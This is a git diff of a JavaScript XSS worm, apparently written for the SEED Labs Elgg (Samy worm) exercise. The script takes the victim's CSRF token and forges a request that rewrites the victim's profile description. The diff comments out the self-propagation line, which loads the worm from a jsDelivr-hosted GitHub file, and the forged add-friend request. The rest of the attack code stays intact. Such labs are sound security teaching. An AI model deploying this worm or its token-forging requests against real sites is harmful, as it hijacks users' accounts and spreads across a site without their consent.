@@ -8,10 +8,10 @@ window.onload = function(){
     var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
 
     // Script code to propagate the worm by injecting itself into victim's profile description.
-    var wormScript = '<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/Kenzie-Young/xss-worm@main/xss-worm.js"></script>';
+    //var wormScript = '<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/Kenzie-Young/xss-worm@main/xss-worm.js"></script>';
     
     // Code to update victim's profile.
-    var content = "description=" + encodeURIComponent("I work at Google as a dog walker.") + encodeURIComponent(wormScript); 
+    var content = "description=" + encodeURIComponent("I work at Google as a dog walker."); //+ encodeURIComponent(wormScript); 
 
     var samyGuid = 59;
 
@@ -27,10 +27,10 @@ window.onload = function(){
     }
     
     // Code to add victim as friend.
-    var addFriendUrl = "http://www.seed-server.com/action/friends/add?friend=" + samyGuid + ts + token;
-    console.log(addFriendUrl);
-    var AjaxFriend = new XMLHttpRequest();
-    AjaxFriend.open("GET", addFriendUrl, true);
-    AjaxFriend.send(); 
+    // var addFriendUrl = "http://www.seed-server.com/action/friends/add?friend=" + samyGuid + ts + token;
+    // console.log(addFriendUrl);
+    // var AjaxFriend = new XMLHttpRequest();
+    // AjaxFriend.open("GET", addFriendUrl, true);
+    // AjaxFriend.send(); 
 }
 </script>
